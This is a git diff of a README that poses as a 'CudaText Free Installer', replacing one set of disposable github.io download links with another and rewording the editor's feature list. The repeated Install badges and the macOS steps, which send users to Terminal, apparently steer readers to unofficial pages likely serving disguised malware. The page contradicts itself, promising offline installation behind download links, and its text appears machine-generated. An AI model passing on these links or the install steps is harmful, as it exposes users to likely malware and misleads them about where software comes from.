@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Text+Editor-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 CudaText Free Installer** — CudaText is a free, open-source cross-platform code editor written in Lazarus/Pascal. Works without internet access, no account required. Full offline installation.
+**💻 CudaText Free Installer** — CudaText is a free, cross-platform code editor with syntax highlighting for 300+ languages, multi-caret editing, a plugin system in Python, and support for Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install CudaText](https://img.shields.io/badge/⬇_Install_CudaText-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install CudaText](https://img.shields.io/badge/⬇_Install_CudaText-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About CudaText
 
-CudaText is a free, open-source cross-platform code editor written in Lazarus/Pascal. Supports syntax highlighting for hundreds of languages, multi-caret editing, code snippets, a Python plugin system, and file tree navigation. CudaText aims to provide a Sublime Text-like experience with full open-source code and active development on Windows, macOS, and Linux.
+CudaText is a free, cross-platform code editor with syntax highlighting for 300+ languages, multi-caret editing, a plugin system in Python, and support for Windows, macOS, and Linux. It provides Sublime Text-like features in a free, open-source package.
 
 ---
 
 ## ❌ Problem: CudaText is hard to access
 
-- **Community Size** — Smaller user base and plugin ecosystem than major editors
-- **IDE Features** — Less comprehensive IDE-like features than VS Code or JetBrains
-- **Documentation** — Some features lack comprehensive documentation
-- **Plugin Quality** — Community plugin quality varies significantly
+- **Smaller Community** — Fewer plugins and themes than VS Code or Sublime Text
+- **Performance** — Not as fast as Sublime Text for very large files
+- **Plugin API** — Python plugin API less mature than VS Code extension system
+- **macOS Experience** — Less native-feeling than platform-native editors on Mac
 
 ---
 
@@ -61,9 +61,9 @@ CudaText is a free, open-source cross-platform code editor written in Lazarus/Pa
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ CudaText is a free, open-source cross-platform code editor written in Lazarus/Pa
 
 <div align="center">
 
-[![⬇ Install CudaText](https://img.shields.io/badge/⬇_Install_CudaText-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install CudaText](https://img.shields.io/badge/⬇_Install_CudaText-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ CudaText is a free, open-source cross-platform code editor written in Lazarus/Pa
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ CudaText is a free, open-source cross-platform code editor written in Lazarus/Pa
 
 ---
 
-**CudaText Free Installer** — CudaText is a free, open-source cross-platform code editor written in Lazarus/Pascal. Install without internet connection today!
+**CudaText Free Installer** — CudaText is a free, cross-platform code editor with syntax highlighting for 300+ languages, multi-caret editing, a plugin system in Python, and support for Windows, macOS, and Linux. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install CudaText](https://img.shields.io/badge/⬇_Install_CudaText-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install CudaText](https://img.shields.io/badge/⬇_Install_CudaText-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
